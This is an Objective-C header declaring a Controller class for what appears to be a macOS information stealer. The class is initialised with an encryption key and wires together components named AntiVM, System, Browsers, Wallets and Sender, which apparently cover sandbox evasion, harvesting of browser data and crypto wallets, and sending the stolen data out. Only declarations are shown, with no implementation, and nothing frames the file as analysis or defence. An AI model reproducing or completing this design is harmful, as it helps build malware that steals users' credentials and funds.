#import <Foundation/Foundation.h>

@class Tools, AntiVM, System, Browsers, Sender, Wallets;

@interface Controller : NSObject

- (instancetype)initWithEncryptionKey:(NSString *)encryptionKey;
- (void)manage;

@property (nonatomic, strong) Tools *tools;
@property (nonatomic, strong) AntiVM *antivm;
@property (nonatomic, strong) System *system;
@property (nonatomic, strong) Browsers *browsers;
@property (nonatomic, strong) Sender *sender;
@property (nonatomic, strong) Wallets *wallets;
@property (nonatomic, strong) NSString *encryptionKey;

@end
